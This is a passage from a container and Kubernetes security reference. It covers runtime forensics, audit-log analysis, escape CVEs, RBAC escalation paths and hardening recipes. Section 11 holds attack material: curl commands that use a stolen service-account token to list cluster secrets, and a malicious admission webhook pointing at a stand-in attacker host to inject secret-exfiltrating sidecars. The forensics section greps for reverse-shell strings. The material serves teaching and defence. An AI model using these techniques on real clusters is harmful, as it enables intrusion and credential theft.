    when: always
  allow_failure: false
```

**Grype with SBOM-based scanning:**

```bash
# Generate SBOM with syft, then scan with grype
syft ${IMAGE}:${TAG} -o spdx-json > sbom.spdx.json
grype sbom:sbom.spdx.json --fail-on critical --output json > grype-report.json
```

---

## 10. Container and Kubernetes forensics

### 10.1 Container runtime forensics

When investigating a compromised container, artifacts differ depending on the runtime.

**containerd artifact locations:**

| Artifact | Path | Content |
|---|---|---|
| Container metadata | `/var/lib/containerd/io.containerd.metadata.v1.bolt/meta.db` | BoltDB with container config, labels, creation time |
| Content store | `/var/lib/containerd/io.containerd.content.v1.content/blobs/sha256/` | Image layers (OCI blobs) |
| Snapshots (overlayfs) | `/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/` | Filesystem layers and diffs |
| Runtime state | `/run/containerd/io.containerd.runtime.v2.task/k8s.io/<container-id>/` | OCI runtime spec, `config.json` |

**CRI-O artifact locations:**

| Artifact | Path | Content |
|---|---|---|
| Container state | `/var/lib/containers/storage/overlay-containers/<id>/userdata/` | `config.json`, `state.json` |
| Overlay diffs | `/var/lib/containers/storage/overlay/<id>/diff/` | Writable layer changes |
| Logs | `/var/log/crio/pods/<pod-id>/` | Container stdout/stderr |

**Capture a running container's filesystem diff (evidence collection):**

```bash
# For containerd (via ctr)
ctr -n k8s.io snapshot mounts /tmp/mnt <snapshot-key> | xargs mount
tar czf /evidence/container-fs-$(date -u +%Y%m%dT%H%M%SZ).tar.gz -C /tmp/mnt .
umount /tmp/mnt

# For Docker
docker diff <container-id> > /evidence/fs-changes.txt
docker export <container-id> > /evidence/container-export.tar
sha256sum /evidence/container-export.tar > /evidence/container-export.tar.sha256
```

### 10.2 Kubernetes audit log forensic analysis

Audit logs are the primary evidence source for Kubernetes control-plane investigations.

**Reconstruct attacker timeline from audit logs:**

```bash
# Extract all actions by a specific user/service account
cat audit.log | jq -r '
  select(.user.username == "system:serviceaccount:default:compromised-sa") |
  [.requestReceivedTimestamp, .verb, .objectRef.resource,
   .objectRef.namespace, .objectRef.name, .responseStatus.code] | @tsv
' | sort -t$'\t' -k1

# Identify RBAC changes (clusterroles, clusterrolebindings, roles, rolebindings)
cat audit.log | jq -r '
  select(.objectRef.resource | test("roles|rolebindings|clusterroles|clusterrolebindings")) |
  select(.verb | test("create|update|patch|delete")) |
  [.requestReceivedTimestamp, .user.username, .verb,
   .objectRef.resource, .objectRef.name] | @tsv
'
```

### 10.3 Pod filesystem forensics

**Ephemeral storage analysis.** Container filesystems use overlay mounts. The writable upper layer captures all runtime modifications — malware dropped, configuration changes, and attacker tooling.

```bash
# Locate the overlay upper directory for a running pod's container
CONTAINER_ID=$(crictl ps --name <container-name> -q)
UPPER_DIR=$(crictl inspect $CONTAINER_ID | jq -r '.info.runtimeSpec.root.path')

# Copy upper layer for offline analysis
cp -a $UPPER_DIR /evidence/overlay-upper-$(date -u +%Y%m%dT%H%M%SZ)/
find /evidence/overlay-upper-*/ -type f -exec sha256sum {} \; > /evidence/overlay-hashes.txt
```

**Check for suspicious files in the writable layer:**

```bash
# Find recently modified executables
find $UPPER_DIR -type f -executable -newer /tmp/reference-timestamp -ls

# Find hidden files or directories
find $UPPER_DIR -name ".*" -ls

# Check for reverse shell indicators
grep -rl "bash -i" $UPPER_DIR 2>/dev/null
grep -rl "/dev/tcp/" $UPPER_DIR 2>/dev/null
```

### 10.4 Container escape forensic indicators

Evidence of container escape attempts or successes:

| Indicator | Location | Meaning |
|---|---|---|
| Write to `/sys/fs/cgroup/*/release_agent` | Host cgroup filesystem | CVE-2022-0492 cgroup escape |
| `/proc/self/exe` symlink manipulation | Container `/proc` | CVE-2019-5736 runc overwrite |
| Unexpected processes with host PID namespace | Host `ps aux` output | Container breakout via `--pid=host` |
| `WORKDIR` fd leak exploitation artifacts | runc debug logs | CVE-2024-21626 Leaky Vessels |
| `core_pattern` containing pipe to attacker binary | `/proc/sys/kernel/core_pattern` | Core pattern escape |
| Abstract unix socket connections from container | Container network activity | containerd-shim exploit (CVE-2020-15257) |

### 10.5 etcd snapshot analysis

etcd stores all Kubernetes cluster state. A snapshot provides complete point-in-time reconstruction.

```bash
# Take etcd snapshot (requires etcd client certs)
ETCDCTL_API=3 etcdctl snapshot save /evidence/etcd-snapshot.db \
  --endpoints=https://127.0.0.1:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key

sha256sum /evidence/etcd-snapshot.db > /evidence/etcd-snapshot.db.sha256

# Restore to a temporary directory for offline analysis
ETCDCTL_API=3 etcdctl snapshot restore /evidence/etcd-snapshot.db \
  --data-dir /tmp/etcd-forensic-restore

# Query restored etcd for secrets
ETCDCTL_API=3 etcdctl get /registry/secrets --prefix --keys-only \
  --endpoints=http://localhost:2399
```

### 10.6 Cloud-managed Kubernetes forensics

**EKS.** Control-plane audit logs are delivered to CloudWatch Logs under `/aws/eks/<cluster>/cluster`. The log group contains `kube-apiserver-audit` stream. Node-level forensics require SSM Session Manager or direct EC2 access to worker nodes; Fargate pods have no accessible node.

**GKE.** Admin Activity audit logs are always on. Data Access logs (including Kubernetes API reads) must be explicitly enabled. Logs appear in Cloud Logging under `resource.type="k8s_cluster"`. GKE Autopilot restricts node access entirely — forensic data is limited to control-plane logs and workload-level artifacts.

**AKS.** Diagnostic settings must be configured to send `kube-audit` and `kube-audit-admin` categories to a Log Analytics workspace or Storage Account. By default, AKS does not retain audit logs. Node access is via `kubectl debug node/<node-name>` or SSH (if configured).

---

## 11. Advanced container attack techniques

### 11.1 Container escape via kernel vulnerabilities

Container isolation depends on the shared host kernel. Any kernel vulnerability reachable from within the container's syscall and namespace context can be weaponized for escape.

**CVE-2022-0185 — heap overflow in `legacy_parse_param`.** An unprivileged user inside a container with user namespace access can trigger a heap buffer overflow in the VFS filesystem context subsystem. The vulnerability is in `fs/fs_context.c:legacy_parse_param()`, where a length check is missing on the filesystem parameter string. Exploitation requires `CAP_SYS_ADMIN` within a user namespace (available by default in many container configurations). The exploit achieves kernel code execution via heap spray targeting SLUB allocator objects, overwriting a function pointer in an adjacent `msg_msg` structure.

**CVE-2024-21626 — runc Leaky Vessels.** During `WORKDIR` processing, runc leaks a file descriptor pointing to the host filesystem. An attacker crafting a malicious Dockerfile (or OCI image) with a `WORKDIR` directive referencing `/proc/self/fd/<leaked-fd>` can break out of the container's filesystem view. The attack works during `docker build` or `docker run` — the leaked fd provides a reference to the host's `/sys/fs/cgroup` directory. Unlike traditional runtime escapes, this attack can be triggered by simply building an image.

```bash
# Verify runc version (patched in runc 1.1.12)
runc --version
# runc version 1.1.12 or later = patched

# Check if running vulnerable version
if [[ $(runc --version | grep -oP 'runc version \K[0-9.]+') < "1.1.12" ]]; then
  echo "VULNERABLE to CVE-2024-21626"
fi
```

### 11.2 Kubernetes RBAC escalation paths

RBAC misconfigurations create escalation chains. The following matrix shows common escalation paths from low-privilege to cluster-admin.

| Starting Permission | Escalation Technique | Result |
|---|---|---|
| `pods/exec` on any namespace | Exec into pod with mounted SA token | Assume that pod's SA permissions |
| `create pods` | Create pod with `automountServiceAccountToken: true` in target namespace | Access namespace's default SA |
| `create pods` + `nodes/proxy` | Create pod, then proxy through kubelet to other pods | Cross-pod lateral movement |
| `escalate` verb on roles | Modify a role to grant more permissions than the caller has | Arbitrary RBAC escalation |
| `bind` verb on clusterrolebindings | Bind `cluster-admin` ClusterRole to attacker's SA | Full cluster control |
| `impersonate` verb on users | Impersonate cluster-admin user | Full cluster control |
| `get secrets` cluster-wide | Read all SA tokens from every namespace | Assume any SA identity |

### 11.3 Service account token abuse and lateral movement

Every pod by default mounts a service account token at `/var/run/secrets/kubernetes.io/serviceaccount/token`. If the SA has over-permissioned RBAC bindings, an attacker with code execution in one pod can pivot across the cluster.

```bash
# Inside a compromised pod — enumerate accessible resources
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}

# Check current permissions
curl -sk -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
  -X POST -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"verb":"list","resource":"secrets","namespace":"kube-system"}}}'

# List secrets (if permitted)
curl -sk -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/namespaces/kube-system/secrets" | jq '.items[].metadata.name'

# Enumerate all service accounts across namespaces
curl -sk -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/serviceaccounts" | jq '.items[] | {ns: .metadata.namespace, name: .metadata.name}'
```

### 11.4 Secrets theft patterns

Kubernetes secrets are stored base64-encoded (not encrypted) in etcd by default.

**etcd direct access.** If an attacker gains access to etcd (unencrypted client port 2379, stolen client certs, or node-level access), all secrets are readable in plaintext.

**Mounted secrets.** Secrets mounted as volumes or environment variables are visible inside the pod. `env` or `cat /run/secrets/...` extracts them. An attacker in any pod with a mounted secret can exfiltrate it.

**Environment variable leakage.** Secrets injected as environment variables persist in `/proc/<pid>/environ` for every process in the container. A crash dump, debug endpoint, or application error page can leak them.

### 11.5 Supply chain attacks via admission webhook manipulation

Mutating admission webhooks modify pod specs before scheduling. An attacker with `create/update` permissions on `mutatingwebhookconfigurations` can register a webhook that silently injects a sidecar into every new pod.

```yaml
apiVersion: admissionregistration.k8s.io/v1
kind: MutatingWebhookConfiguration
metadata:
  name: attacker-webhook
webhooks:
  - name: inject.attacker.io
    clientConfig:
      url: "https://attacker-controlled-server.example.com/mutate"
    rules:
      - operations: ["CREATE"]
        apiGroups: [""]
        apiVersions: ["v1"]
        resources: ["pods"]
    admissionReviewVersions: ["v1"]
    sideEffects: None
    failurePolicy: Ignore  # Silent failure prevents detection
```

The attacker's webhook endpoint returns a JSON patch that adds a sidecar container to every pod spec — this sidecar exfiltrates secrets, environment variables, or network traffic.

### 11.6 Sidecar container injection attacks

Legitimate sidecar injection (Istio, Linkerd) uses mutating webhooks. Attackers replicate this pattern to inject malicious containers.

**Detection.** Monitor `mutatingwebhookconfigurations` for unexpected changes:

```bash
# Audit log query: who modified webhook configurations
cat audit.log | jq -r '
  select(.objectRef.resource == "mutatingwebhookconfigurations") |
  select(.verb | test("create|update|patch")) |
  [.requestReceivedTimestamp, .user.username, .verb, .objectRef.name] | @tsv
'
```

---

## 12. Container and Kubernetes hardening reference

### 12.1 Pod Security Standards — Restricted profile

The Restricted profile is the most hardened PSS level. Enforcing it at the namespace level blocks privileged containers, host namespace access, and dangerous capabilities.

```yaml
apiVersion: v1
kind: Namespace
metadata:
  name: production
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/enforce-version: latest
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/warn: restricted
```

**Restricted profile — what it blocks:**

| Control | Restriction |
|---|---|
| `privileged` | Must be `false` |
| `hostPID`, `hostIPC`, `hostNetwork` | Must be `false` |
| `hostPorts` | Must be undefined or empty |
| `allowPrivilegeEscalation` | Must be `false` |
| `runAsNonRoot` | Must be `true` |
| `seccompProfile.type` | Must be `RuntimeDefault` or `Localhost` |
| `capabilities.drop` | Must include `ALL` |
| `capabilities.add` | Only `NET_BIND_SERVICE` permitted |

### 12.2 NetworkPolicy recipes

**Default deny all ingress and egress:**

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: production
spec:
  podSelector: {}
  policyTypes:
    - Ingress
    - Egress
```

**Allow only specific service-to-service communication:**

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-frontend-to-backend
  namespace: production
spec:
  podSelector:
    matchLabels:
      app: backend
  policyTypes:
    - Ingress
  ingress:
    - from:
        - podSelector:
            matchLabels:
              app: frontend
      ports:
        - protocol: TCP
          port: 8080
```

**Allow DNS egress (required for almost all pods):**

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-dns-egress
  namespace: production
spec:
  podSelector: {}
  policyTypes:
    - Egress
  egress:
    - to:
        - namespaceSelector:
            matchLabels:
              kubernetes.io/metadata.name: kube-system
          podSelector:
            matchLabels:
              k8s-app: kube-dns
      ports:
        - protocol: UDP
          port: 53
        - protocol: TCP
          port: 53
```

### 12.3 Seccomp profile generation and deployment

Seccomp (Secure Computing Mode) restricts the set of syscalls a container process can invoke. A tailored profile blocks exploit-critical syscalls while allowing the application's legitimate operations.

**Generate a custom seccomp profile using the Security Profiles Operator:**

```yaml
apiVersion: security-profiles-operator.x-k8s.io/v1beta1
kind: SeccompProfile
metadata:
  name: app-restricted
  namespace: production
spec:
  defaultAction: SCMP_ACT_ERRNO
  architectures:
    - SCMP_ARCH_X86_64
    - SCMP_ARCH_AARCH64
  syscalls:
    - action: SCMP_ACT_ALLOW
      names:
        - read
        - write
        - openat
        - close
        - fstat
        - mmap
        - mprotect
        - munmap
        - brk
        - epoll_ctl
        - epoll_wait
        - accept4
        - bind
        - listen
        - socket
        - connect
        - getpid
        - exit_group
        - futex
        - clone3
        - rt_sigaction
        - rt_sigprocmask
```

**Reference the profile in a pod spec:**

```yaml
securityContext:
  seccompProfile:
    type: Localhost
    localhostProfile: operator/production/app-restricted.json
```

### 12.4 Runtime class configuration

RuntimeClass allows pods to select alternative container runtimes that provide stronger isolation than the default runc.

**gVisor (runsc):**

```yaml
apiVersion: node.k8s.io/v1
kind: RuntimeClass
metadata:
  name: gvisor
handler: runsc
---
apiVersion: v1
kind: Pod
metadata:
  name: sandboxed-app
spec:
  runtimeClassName: gvisor
  containers:
    - name: app
      image: myregistry/app:v1.2.3
```

gVisor intercepts syscalls in user space, reimplementing a subset of the Linux kernel in Go. The host kernel attack surface is reduced because the container never directly invokes host kernel syscalls. Trade-off: ~5–15% CPU overhead, not all syscalls supported (~200 of ~300+).

**Kata Containers:**

```yaml
apiVersion: node.k8s.io/v1
kind: RuntimeClass
metadata:
  name: kata
handler: kata-qemu
```

Kata runs each pod inside a lightweight VM (QEMU/Cloud Hypervisor). The kernel is not shared — each pod gets its own guest kernel. Stronger isolation than gVisor at the cost of higher memory overhead (~30–128 MB per pod) and slower cold start (~500ms–1s).

### 12.5 CIS Kubernetes Benchmark automation

The CIS Kubernetes Benchmark defines ~250 controls across master node, worker node, policies, and RBAC. Automated scanning identifies drift from the benchmark.

```bash
# kube-bench — run CIS benchmark checks
# On a master node
kube-bench run --targets master --benchmark cis-1.8

# On a worker node
kube-bench run --targets node --benchmark cis-1.8

# Output as JSON for ingestion into SIEM
kube-bench run --targets master,node --benchmark cis-1.8 \
  --json > /var/log/kube-bench-$(date -u +%Y%m%dT%H%M%SZ).json
```

**Critical CIS controls to verify (subset):**

| Control ID | Description | Risk if failed |
|---|---|---|
| 1.2.6 | Ensure `--kubelet-certificate-authority` is set | MITM on kubelet communication |
| 1.2.16 | Ensure admission plugins include `PodSecurity` | No enforcement of Pod Security Standards |
| 1.2.18 | Ensure `--audit-log-path` is set | No audit trail for API server activity |
| 4.2.1 | Ensure `--anonymous-auth` is `false` on kubelet | Unauthenticated kubelet API access |
| 4.2.6 | Ensure `--protect-kernel-defaults` is `true` | Container can modify kernel tunables |
| 5.1.6 | Ensure default service accounts are not actively used | Over-permissioned default SA |

### 12.6 Multi-tenancy isolation patterns

Kubernetes is not natively multi-tenant. Isolation must be layered across namespace boundaries, RBAC, network policies, resource quotas, and optionally virtual clusters.

**Namespace isolation with RBAC, NetworkPolicy, and ResourceQuota:**

```yaml
# Tenant namespace with full isolation
apiVersion: v1
kind: Namespace
metadata:
  name: tenant-alpha
  labels:
    pod-security.kubernetes.io/enforce: restricted
    tenant: alpha
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: tenant-alpha-admin
  namespace: tenant-alpha
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: admin
subjects:
  - kind: Group
    name: tenant-alpha-admins
    apiGroup: rbac.authorization.k8s.io
---
apiVersion: v1
kind: ResourceQuota
metadata:
  name: tenant-alpha-quota
  namespace: tenant-alpha
spec:
  hard:
    requests.cpu: "8"
    requests.memory: 16Gi
    limits.cpu: "16"
    limits.memory: 32Gi
    pods: "50"
    services: "10"
    secrets: "20"
```

**Virtual clusters (vcluster).** For stronger tenant isolation, virtual clusters run a separate Kubernetes control plane (API server + etcd or embedded controller) inside a namespace of the host cluster. Each tenant gets its own `kube-system`, its own RBAC, and its own set of CRDs — without the cost of a dedicated physical cluster.

---

## 13. Cross-references

**To Chapter 10A:** Cloud provider IAM (AWS IAM, GCP IAM, Azure RBAC) provides the credentials and permissions that Kubernetes uses for cloud-resource access (IRSA, Workload Identity, AAD Pod Identity). Container escape from a cloud-hosted container often leads to cloud credential theft via IMDS (Chapter 10A §1.2, §2.2, §3.1). Fargate task roles, Cloud Run service accounts, and ACI managed identities are the serverless-container equivalent of EC2 instance profiles.

**To Domain 2:** Container isolation relies on Linux namespaces (Chapter 2C §3), cgroups (Chapter 2C §4), seccomp (Chapter 2B §3), capabilities (Chapter 2C §1), and LSMs (Chapter 2C §5). Every container escape technique in §1.6 exploits a gap in one of these isolation layers. The cgroup `release_agent` escape (§1.6.4) is the same CVE-2022-0492 described in Domain 2, Chapter 2C §4.4. User namespace remapping (§1.4) maps to Domain 2, Chapter 2C §3.4.

**To Domain 5:** Container escapes that achieve kernel code execution (via kernel vulnerabilities reachable from inside the container) use the same exploitation primitives as Domain 5 (SLUB spray, vtable hijack, `commit_creds`). The container's seccomp filter determines which kernel attack surface is reachable. CVE-2022-0185 (§8) is a kernel exploit reachable from within containers with user namespace access.

**To Domain 8:** Serverless event injection (§6.1) is the cloud-native equivalent of web application injection (Chapter 8B §1–7). The event data is the untrusted input; the Lambda/Function handler is the vulnerable parser. DNS-based exfiltration from Kubernetes (§2.5) mirrors DNS tunneling techniques from Domain 8 network exfiltration.

**To Domain 9:** Supply chain attacks (§3.1) — base image poisoning and CI/CD pipeline compromise — are container-specific instances of the broader software supply chain attacks covered in Domain 9. Image signing with cosign/notation (§3.4) and SBOM generation (§3.4) are the container ecosystem's implementation of supply chain integrity controls.
